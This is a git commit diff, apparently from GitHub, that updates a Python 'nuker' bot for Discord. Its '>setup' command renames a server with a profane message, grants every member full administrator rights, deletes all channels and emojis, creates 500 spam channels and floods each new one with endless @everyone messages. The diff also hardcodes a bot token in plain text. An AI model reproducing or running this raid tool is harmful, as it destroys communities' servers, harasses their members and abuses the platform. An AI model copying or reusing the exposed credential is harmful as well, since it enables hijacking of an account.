e3e3efc59d4616b3a7eaca7a9e5897eda7031a2a
CxllZ <72345758+CxllZ@users.noreply.github.com>
2021-05-05 23:57:14 +0100

    Update main.py

--- main.py
+++ main.py
@@ -1,14 +1,16 @@
-import discord, os, random
+import discord, random, asyncio
 from discord.ext import commands
-
-print("Connecting to nuker...")
+from discord import Permissions
 
 prefix = ">"
+token = "ODM4ODMwNDgxMDcyMDYyNDg0.YJAzww.vpM1V1sZzTaHHLwiiVEKnrilN2Y"
 client = commands.Bot(command_prefix=commands.when_mentioned_or(prefix))
-channel_names = ['Fucked By Chupapi!', 'Chupapi Nuked This', 'Chupapi Runs You']
+
+SPAM_CHANNEL =  ["Chupapi runs you", "Chupapi","Chupapi Beamed You","Beamed by chupapi","I run you","kinda got beamed by Chupapi"]
+SPAM_MESSAGE = ["@everyone CHUPAPI MUNYANYOO?!(SERVER GOT RAIDED, WHAT ASHAME)"]
 
 @client.event
-async def on_connect():
+async def on_ready():
     print('We have logged in as {0.user}'.format(client))
     print(f"username: {client.user.name}")
     print(f"id: {client.user.id}")
@@ -16,43 +18,43 @@ async def on_connect():
     print('===============================================')
     await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=f">setup | {len(client.guilds)} servers"))
 
-@client.command(pass_context=True)
+@client.command()
 async def setup(ctx):
-    guild = ctx.message.guild
-    await ctx.message.delete()
-
-    for channel in list(ctx.message.guild.channels):
-        try:
-            await channel.delete()
-            print(f"{channel.name} has been deleted...")
-        except:
-            pass
-    
-    for i in range(1):
-        try:
-            await ctx.guild.edit(name="Fucked By Chupapi!")
+      await ctx.message.delete()
+      for i in range(1):
+          try:
+            await ctx.guild.edit(name="FUCKED BY CHUPAPI MUNYANYO!")
             print("server name has been changed...")
-        except:
+          except:
             print("server name could not be changed...")
+      guild = ctx.guild
+      try:
+        role = discord.utils.get(guild.roles, name = "@everyone")
+        await role.edit(permissions = Permissions.all())
+        print("I have given everyone admin.")
+      except:
+        print("I was unable to give everyone admin")
+      for channel in guild.channels:
+        try:
+          await channel.delete()
+          print(f"{channel.name} was deleted.")
+        except:
+          print(f"{channel.name} was NOT deleted.")
+      for emoji in list(ctx.guild.emojis):
+        try:
+            await emoji.delete()
+            print(f"{emoji.name} Was deleted")
+        except:
+            print(f"{emoji.name} Wasn't Deleted")
+      amount = 500
+      for i in range(amount):
+        await guild.create_text_channel(random.choice(SPAM_CHANNEL))
+      print(f"nuked {guild.name} Successfully.")
+      return
 
-    guild = ctx.guild
-
-    for i in range(1):
-        await guild.create_text_channel(random.choice(channel_names))
-        await channel.send("@everyone This Server Got Fucked By Chupapi, LOL!")
+@client.event
+async def on_guild_channel_create(channel):
     while True:
-        for channel in guild.text_channels:
-            for i in range(500):
-                await guild.create_text_channel(random.choice(channel_names))
-                await channel.send("@everyone This Server Got Fucked By Chupapi, LOL!")
+      await channel.send(random.choice(SPAM_MESSAGE))
 
-    #guild = ctx.message.guild
-    #await ctx.message.delete()
-    #for i in range(2):
-        #print("Spammed Channels!")
-        #while True:
-            #for channel in guild.text_channels:
-                #await channel.send("@everyone This Server Got Fucked By Chupapi, LOL!")
-
-
-client.run("ODM4ODMwNDgxMDcyMDYyNDg0.YJAzww.vpM1V1sZzTaHHLwiiVEKnrilN2Y")
+client.run(token, bot=True)
